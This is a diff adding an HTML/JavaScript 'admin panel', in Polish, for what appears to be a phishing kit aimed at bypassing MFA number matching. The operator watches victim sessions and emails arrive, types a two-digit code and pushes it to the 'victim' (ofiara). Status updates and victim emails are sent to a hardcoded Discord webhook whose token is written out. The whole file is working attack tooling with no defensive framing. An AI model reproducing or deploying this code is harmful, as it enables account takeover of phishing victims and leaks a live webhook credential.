@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel Admina - Efekt Motyla</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
+            background: #0b0012;
+            color: #f0e6ff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            background-image: radial-gradient(ellipse at 50% 0%, #1a0a2e 0%, #0b0012 70%);
+        }
+        .panel {
+            max-width: 560px;
+            width: 100%;
+            background: #12001a;
+            border: 1px solid #2a1040;
+            border-radius: 20px;
+            padding: 36px 32px 32px;
+            box-shadow: 0 20px 60px rgba(168,85,247,0.06);
+        }
+        .panel .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 4px;
+        }
+        .panel .header h1 {
+            font-size: 22px;
+            background: linear-gradient(135deg, #a855f7, #ec4899);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .panel .header .live {
+            font-size: 11px;
+            padding: 4px 12px;
+            border-radius: 20px;
+            background: rgba(34,197,94,0.15);
+            color: #22c55e;
+            border: 1px solid rgba(34,197,94,0.2);
+            font-weight: 600;
+            letter-spacing: 1px;
+        }
+        .panel .header .live.off {
+            background: rgba(239,68,68,0.12);
+            color: #ef4444;
+            border-color: rgba(239,68,68,0.2);
+        }
+        .panel .sub {
+            color: #9d6aaa;
+            font-size: 13px;
+            margin-bottom: 24px;
+        }
+
+        .toggle-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 16px;
+            background: rgba(0,0,0,0.2);
+            border: 1px solid #2a1040;
+            border-radius: 10px;
+            margin-bottom: 16px;
+        }
+        .toggle-row .label { font-size: 14px; font-weight: 500; }
+        .toggle-row .label small { font-weight: 400; color: #9d6aaa; font-size: 12px; }
+        .toggle-switch {
+            width: 48px;
+            height: 26px;
+            background: #2a1040;
+            border-radius: 13px;
+            cursor: pointer;
+            transition: background 0.3s;
+            position: relative;
+            flex-shrink: 0;
+        }
+        .toggle-switch.active { background: #22c55e; }
+        .toggle-switch .knob {
+            width: 20px;
+            height: 20px;
+            background: #fff;
+            border-radius: 50%;
+            position: absolute;
+            top: 3px;
+            left: 3px;
+            transition: all 0.3s;
+        }
+        .toggle-switch.active .knob { left: 25px; }
+
+        .status-box {
+            background: rgba(0,0,0,0.2);
+            border: 1px solid #2a1040;
+            border-radius: 10px;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+        }
+        .status-box .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 4px 0;
+            font-size: 13px;
+        }
+        .status-box .row .lbl { color: #9d6aaa; }
+        .status-box .row .val { color: #f0e6ff; word-break: break-all; }
+        .status-box .row .val.empty { color: #4a2a5a; }
+
+        /* NUMER - 2 CYFRY */
+        .code-input-row {
+            display: flex;
+            gap: 10px;
+            margin: 12px 0 16px;
+            align-items: center;
+        }
+        .code-input-row input {
+            flex: 1;
+            padding: 14px 16px;
+            background: rgba(0,0,0,0.3);
+            border: 1px solid #2a1040;
+            border-radius: 10px;
+            color: #f0e6ff;
+            font-size: 36px;
+            font-family: 'Bebas Neue', cursive;
+            letter-spacing: 8px;
+            text-align: center;
+            outline: none;
+            transition: border-color 0.3s;
+            max-width: 120px;
+        }
+        .code-input-row input:focus { border-color: #a855f7; }
+        .code-input-row input::placeholder {
+            color: #4a2a5a;
+            font-size: 16px;
+            letter-spacing: 2px;
+            font-family: 'Inter', sans-serif;
+        }
+        .code-input-row .hint {
+            color: #4a2a5a;
+            font-size: 12px;
+        }
+
+        .code-display {
+            font-family: 'Bebas Neue', cursive;
+            font-size: 48px;
+            text-align: center;
+            color: #fbbf24;
+            letter-spacing: 12px;
+            padding: 12px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 12px;
+            border: 1px solid #2a1040;
+            margin: 4px 0 12px;
+            transition: all 0.3s;
+            min-height: 80px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .code-display.ready { color: #a855f7; border-color: #a855f7; }
+        .code-display.sent { color: #22c55e; border-color: #22c55e; }
+
+        .btn-send {
+            width: 100%;
+            padding: 14px;
+            background: #22c55e;
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .btn-send:hover { opacity: 0.9; transform: scale(1.01); }
+        .btn-send:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .btn-send.off { background: #4a2a5a; }
+
+        .btn-refresh {
+            width: 100%;
+            padding: 10px;
+            background: transparent;
+            border: 1px solid #2a1040;
+            border-radius: 10px;
+            color: #9d6aaa;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 8px;
+        }
+        .btn-refresh:hover { border-color: #a855f7; color: #a855f7; }
+
+        .log {
+            margin-top: 16px;
+            padding: 12px;
+            background: rgba(0,0,0,0.2);
+            border: 1px solid #2a1040;
+            border-radius: 10px;
+            max-height: 160px;
+            overflow-y: auto;
+            font-size: 12px;
+            font-family: monospace;
+            color: #9d6aaa;
+        }
+        .log .entry { padding: 3px 0; border-bottom: 1px solid #1a0020; }
+        .log .entry .t { color: #4a2a5a; }
+        .log .entry .m { color: #f0e6ff; }
+        .log .entry .m.dc { color: #fbbf24; }
+
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #2a1040; border-radius: 2px; }
+
+        @media (max-width: 480px) {
+            .panel { padding: 24px 16px; }
+            .code-display { font-size: 36px; letter-spacing: 8px; min-height: 64px; }
+            .code-input-row input { font-size: 28px; max-width: 90px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="panel">
+
+        <div class="header">
+            <h1>🔒 Panel Admina</h1>
+            <span class="live" id="liveStatus">● LIVE</span>
+        </div>
+        <p class="sub">Wpisz 2-cyfrowy numer, wyślij ofierze — wszystko na Discord</p>
+
+        <!-- TOGGLE ON/OFF -->
+        <div class="toggle-row">
+            <span class="label">🔘 Status <small>(widoczność dla ofiary)</small></span>
+            <div class="toggle-switch active" id="toggleBtn">
+                <div class="knob"></div>
+            </div>
+        </div>
+
+        <!-- STATUS SESJI -->
+        <div class="status-box">
+            <div class="row"><span class="lbl">🆔 Sesja</span><span class="val" id="sessionDisplay">brak</span></div>
+            <div class="row"><span class="lbl">📧 Email</span><span class="val" id="emailDisplay">brak</span></div>
+            <div class="row"><span class="lbl">📱 Status</span><span class="val" id="statusDisplay">⏳ Oczekiwanie...</span></div>
+        </div>
+
+        <!-- WPROWADŹ NUMER (2 CYFRY) -->
+        <div class="code-input-row">
+            <input type="text" id="codeInput" placeholder="81" maxlength="2" inputmode="numeric">
+            <span class="hint">(2 cyfry)</span>
+        </div>
+
+        <!-- PODGLĄD -->
+        <div class="code-display" id="liveCode">--</div>
+
+        <!-- PRZYCISKI -->
+        <button class="btn-send" id="sendBtn" disabled>⏳ Czekam na sesję...</button>
+        <button class="btn-refresh" id="refreshBtn">🔄 Odśwież</button>
+
+        <!-- LOG -->
+        <div class="log" id="log">
+            <div class="entry"><span class="t">[sys]</span> <span class="m">Panel uruchomiony...</span></div>
+        </div>
+
+    </div>
+
+    <script>
+        // ============ CONFIG ============
+        const API = '/api/confirm';
+        const DC = 'https://discord.com/api/webhooks/1527391979820945559/8u5xCAzibI0HUvXlJ1vsVcSEma3OWG8lPWxIpf3ZRJFKUQA4gWEi6XhyTEKiOXKHKhDU';
+
+        // ============ ELEMENTS ============
+        const toggleBtn = document.getElementById('toggleBtn');
+        const liveStatus = document.getElementById('liveStatus');
+        const sessionDisplay = document.getElementById('sessionDisplay');
+        const emailDisplay = document.getElementById('emailDisplay');
+        const statusDisplay = document.getElementById('statusDisplay');
+        const liveCode = document.getElementById('liveCode');
+        const codeInput = document.getElementById('codeInput');
+        const sendBtn = document.getElementById('sendBtn');
+        const refreshBtn = document.getElementById('refreshBtn');
+        const log = document.getElementById('log');
+
+        let isOnline = true;
+        let currentSession = null;
+        let currentEmail = '';
+        let currentCode = '';
+        let checkInterval = null;
+
+        // ============ LOG ============
+        function addLog(msg, type = '') {
+            const entry = document.createElement('div');
+            entry.className = 'entry';
+            const t = new Date().toLocaleTimeString();
+            entry.innerHTML = `<span class="t">[${t}]</span> <span class="m ${type}">${msg}</span>`;
+            log.appendChild(entry);
+            log.scrollTop = log.scrollHeight;
+            if (log.children.length > 30) log.removeChild(log.firstChild);
+        }
+
+        // ============ DC ============
+        function sendDC(msg) {
+            if (!DC) return;
+            fetch(DC, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: msg, username: '🦋 Admin' })
+            }).catch(() => {});
+            addLog('📤 ' + msg, 'dc');
+        }
+
+        // ============ LIVE PREVIEW ============
+        codeInput.addEventListener('input', function() {
+            // Tylko cyfry
+            this.value = this.value.replace(/\D/g, '').slice(0, 2);
+            const val = this.value.trim();
+            if (val && val.length === 2) {
+                liveCode.textContent = val;
+                liveCode.className = 'code-display ready';
+            } else if (val && val.length === 1) {
+                liveCode.textContent = val + '_';
+                liveCode.className = 'code-display ready';
+            } else {
+                liveCode.textContent = '--';
+                liveCode.className = 'code-display';
+            }
+        });
+
+        // ============ TOGGLE ============
+        toggleBtn.addEventListener('click', function() {
+            isOnline = !isOnline;
+            this.classList.toggle('active');
+            liveStatus.textContent = isOnline ? '● LIVE' : '○ OFF';
+            liveStatus.className = 'live' + (isOnline ? '' : ' off');
+            if (isOnline) {
+                statusDisplay.textContent = '✅ Online - aktywny';
+                sendDC('🟢 Panel włączony');
+                addLog('🟢 Panel włączony');
+            } else {
+                statusDisplay.textContent = '⛔ Offline - nieaktywny';
+                sendDC('🔴 Panel wyłączony');
+                addLog('🔴 Panel wyłączony');
+                sendBtn.disabled = true;
+            }
+        });
+
+        // ============ CHECK SESSION ============
+        function checkSession() {
+            if (!isOnline) return;
+            fetch(API + '?list=true')
+                .then(r => r.json())
+                .then(data => {
+                    if (data.sessions && data.sessions.length > 0) {
+                        const s = data.sessions[0];
+                        currentSession = s.session;
+                        currentEmail = s.email || 'brak';
+                        sessionDisplay.textContent = s.session;
+                        emailDisplay.textContent = currentEmail;
+                        statusDisplay.textContent = '📱 Sesja aktywna';
+
+                        if (s.code && s.code !== '--' && s.sent) {
+                            liveCode.textContent = s.code;
+                            liveCode.className = 'code-display sent';
+                            sendBtn.textContent = '✅ Już wysłano (' + s.code + ')';
+                            sendBtn.disabled = true;
+                            statusDisplay.textContent = '📤 Numer już wysłany';
+                            codeInput.value = s.code;
+                        } else if (s.code && s.code !== '--') {
+                            liveCode.textContent = s.code;
+                            liveCode.className = 'code-display ready';
+                            sendBtn.textContent = '📤 Wyślij numer ofierze';
+                            sendBtn.disabled = false;
+                            statusDisplay.textContent = '✅ Kod gotowy: ' + s.code;
+                            codeInput.value = s.code;
+                        } else {
+                            sendBtn.textContent = '📤 Wpisz numer i wyślij';
+                            sendBtn.disabled = false;
+                            statusDisplay.textContent = '✏️ Wpisz 2-cyfrowy numer';
+                        }
+                    } else {
+                        sessionDisplay.textContent = 'brak';
+                        emailDisplay.textContent = 'brak';
+                        statusDisplay.textContent = '⏳ Oczekiwanie na sesję...';
+                        sendBtn.textContent = '⏳ Czekam na sesję...';
+                        sendBtn.disabled = true;
+                    }
+                })
+                .catch(() => {
+                    statusDisplay.textContent = '⚠️ Błąd połączenia';
+                });
+        }
+
+        // ============ SEND CODE ============
+        function sendCode() {
+            if (!currentSession || !isOnline) {
+                addLog('❌ Brak sesji lub offline');
+                return;
+            }
+
+            const code = codeInput.value.trim();
+            if (!code || code.length !== 2 || !/^\d{2}$/.test(code)) {
+                addLog('❌ Wpisz 2-cyfrowy numer!');
+                statusDisplay.textContent = '❌ Wpisz 2 cyfry!';
+                return;
+            }
+
+            // Zapisz kod na backendzie
+            fetch(API, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action: 'set_code', session: currentSession, code: code })
+            }).then(() => {
+                fetch(API, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ action: 'send_code', session: currentSession, code: code })
+                }).then(() => {
+                    liveCode.textContent = code;
+                    liveCode.className = 'code-display sent';
+                    sendBtn.textContent = '✅ Wysłano! (' + code + ')';
+                    sendBtn.disabled = true;
+                    statusDisplay.textContent = '📤 Numer ' + code + ' wysłany do ofiary';
+                    addLog('📤 Wysłano numer: ' + code);
+                    sendDC('📤 WYSŁANO NUMER: ' + code + '\n📧 Email: ' + currentEmail);
+
+                    setTimeout(() => {
+                        sendBtn.textContent = '📤 Wyślij ponownie';
+                        sendBtn.disabled = false;
+                        liveCode.className = 'code-display ready';
+                        statusDisplay.textContent = '✅ Gotowy do ponownego wysłania';
+                    }, 30000);
+                });
+            });
+        }
+
+        // ============ EVENTS ============
+        sendBtn.addEventListener('click', sendCode);
+        refreshBtn.addEventListener('click', function() {
+            addLog('🔄 Ręczne odświeżanie');
+            checkSession();
+        });
+
+        codeInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') sendCode();
+        });
+
+        // ============ START ============
+        addLog('🚀 Panel uruchomiony');
+        addLog('📱 Oczekiwanie na sesję ofiary...');
+        sendDC('🚀 Panel admina uruchomiony');
+        checkSession();
+        if (checkInterval) clearInterval(checkInterval);
+        checkInterval = setInterval(checkSession, 4000);
+
+        console.log('🔒 Panel Admina');
+        console.log('📱 Wpisz 2-cyfrowy numer i wyślij ofierze');
+    </script>
+
+</body>
+</html>
